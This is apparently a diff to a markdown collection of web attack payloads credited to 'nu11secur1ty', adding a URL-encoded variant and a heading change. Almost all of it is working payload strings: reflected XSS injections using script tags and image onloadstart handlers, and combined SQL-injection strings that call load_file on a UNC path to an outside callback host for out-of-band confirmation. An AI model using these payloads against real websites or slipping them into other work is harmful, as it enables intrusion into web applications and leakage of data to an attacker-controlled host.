@@ -14,13 +14,15 @@ qnlxv"><script>alert('hello from nu11secur1ty')</script>sad4r
 ```
 <div><image src=validateNonExistantImage.png onloadstart=alert(1337)>hello from nu11secur1ty</div>
 ```
-## ExistantImage + ENCODED
+## ExistantImage + ENCODED = XSS-Reflected
 ```
 <div><image src=https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/XSS-image/image/kostaakatil.webp onloadstart=alert(1337)>hello from nu11secur1ty</div>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 bbbb'+(select load_file('\\\\716gb1cfe9gkja4zdj45qxx9208vwlkcn0en6bv.stupid.com\\nbq'))+'t8xqv<div><image src=https://media.giphy.com/media/bTByutamJSjhS/giphy.gif onloadstart=alert(1337)>hello from nu11secur1ty</div></script>uou2
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 bbbb'+(select load_file('\\\\716gb1cfe9gkja4zdj45qxx9208vwlkcn0en6bv.stupid.com\\nbq'))+'t8xqv<div><image src=https://media.tenor.com/-K9sHxXAb-cAAAAC/shame-on-you-patricia.gif onloadstart=alert(1337)>hello from nu11secur1ty</div></script>uou2
+------------------------------------------------------------------------------------------------------------------------------------------------------
+%62%62%62%62%27%2b%28%73%65%6c%65%63%74%20%6c%6f%61%64%5f%66%69%6c%65%28%27%5c%5c%5c%5c%37%31%36%67%62%31%63%66%65%39%67%6b%6a%61%34%7a%64%6a%34%35%71%78%78%39%32%30%38%76%77%6c%6b%63%6e%30%65%6e%36%62%76%2e%73%74%75%70%69%64%2e%63%6f%6d%5c%5c%6e%62%71%27%29%29%2b%27%74%38%78%71%76%3c%64%69%76%3e%3c%69%6d%61%67%65%20%73%72%63%3d%68%74%74%70%73%3a%2f%2f%6d%65%64%69%61%2e%74%65%6e%6f%72%2e%63%6f%6d%2f%2d%4b%39%73%48%78%58%41%62%2d%63%41%41%41%41%43%2f%73%68%61%6d%65%2d%6f%6e%2d%79%6f%75%2d%70%61%74%72%69%63%69%61%2e%67%69%66%20%6f%6e%6c%6f%61%64%73%74%61%72%74%3d%61%6c%65%72%74%28%31%33%33%37%29%3e%68%65%6c%6c%6f%20%66%72%6f%6d%20%6e%75%31%31%73%65%63%75%72%31%74%79%3c%2f%64%69%76%3e%3c%2f%73%63%72%69%70%74%3e%75%6f%75%32%0a
 
 ```
 
